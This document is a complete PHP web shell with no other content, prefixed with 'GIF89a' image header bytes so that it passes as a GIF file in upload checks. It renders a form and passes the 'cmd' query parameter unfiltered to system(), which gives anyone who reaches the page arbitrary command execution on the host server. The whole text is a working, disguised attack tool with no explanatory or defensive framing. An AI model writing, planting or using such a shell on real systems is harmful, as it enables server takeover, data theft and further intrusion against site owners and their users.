GIF89a
<?php
echo "<form method='GET'>";
echo "<input type='text' name='cmd'>";
echo "<input type='submit'>";
echo "</form>";

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
